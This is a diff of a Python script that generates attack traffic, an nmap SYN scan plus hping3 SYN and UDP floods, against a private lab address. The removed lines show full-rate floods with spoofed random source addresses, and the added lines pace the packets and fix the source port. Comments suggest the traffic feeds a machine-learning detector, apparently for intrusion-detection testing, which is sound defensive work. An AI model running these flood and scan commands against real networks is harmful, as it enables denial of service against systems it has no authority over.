@@ -2,12 +2,12 @@
 import subprocess
 import random
 import time
-import signal
 import sys
 
 TARGET = "10.0.1.2"
 TCP_PORT = 80
 UDP_PORT = 53
+
 
 def run_nmap_scan():
     print("\n[ATTACK] Running SYN scan...")
@@ -21,10 +21,12 @@ def run_syn_flood(duration=10):
     process = subprocess.Popen([
         "sudo", "hping3",
         "-S",
-        "--flood",
+        "-i", 
+        "u1000",   # 1000 microseconds between packets
+        # "--flood", -> remove for testing to avoid overwhelming the network
         "-p", str(TCP_PORT),
+        "-s", "12345",  # fixed source port
         TARGET,
-        "--rand-source"
     ])
     time.sleep(duration)
     process.terminate()
@@ -35,10 +37,12 @@ def run_udp_flood(duration=10):
     process = subprocess.Popen([
         "sudo", "hping3",
         "--udp",
-        "--flood",
+        "-i", 
+        "u1000",   # 1000 microseconds between packets
+        # "--flood", -> remove for testing to avoid overwhelming the network
         "-p", str(UDP_PORT),
+        "-s", "12345",  # fixed source port
         TARGET,
-        "--rand-source"
     ])
     time.sleep(duration)
     process.terminate()
@@ -48,7 +52,7 @@ def main():
     print(f"[+] Starting mixed malicious traffic against {TARGET}")
     print("[+] Press Ctrl+C to stop\n")
 
-    attacks = [run_nmap_scan, run_syn_flood, run_udp_flood]
+    attacks = [run_syn_flood, run_udp_flood] # take out run_nmap_scan for testing - can't get flow of more than 1 -> need flow of > 20 for ml to run
 
     try:
         while True:
